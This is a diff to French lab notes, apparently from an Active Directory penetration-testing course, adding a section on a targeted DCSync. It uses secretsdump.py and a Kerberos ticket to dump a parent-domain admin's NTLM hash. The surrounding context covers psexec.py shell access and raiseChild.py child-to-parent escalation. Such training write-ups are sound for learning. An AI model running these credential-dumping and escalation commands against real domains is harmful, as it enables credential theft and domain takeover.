@@ -78,6 +78,16 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 #   → whoami : nt authority\system   |   hostname : ACADEMY-EA-DC01
 ```
 
+### DCSync ciblé d'un compte du parent — secretsdump.py (+ le ticket)
+Plutôt qu'un shell, on peut DCSync directement un DA du root grâce aux droits EA du ticket :
+```bash
+secretsdump.py -k -no-pass -just-dc-user INLANEFREIGHT/bross \
+  academy-ea-dc01.inlanefreight.local
+#   (ajouter -target-ip 172.16.5.5 si la résolution du FQDN échoue)
+#   → inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
+#   → NT hash de bross (DA parent) : 49a074a39dd0651f647e765c2cc794c7
+```
+
 ## 5. Version automatisée — raiseChild.py
 
 Automatise tout le child → parent. On fournit juste le DC child + des creds admin du child ; le script :
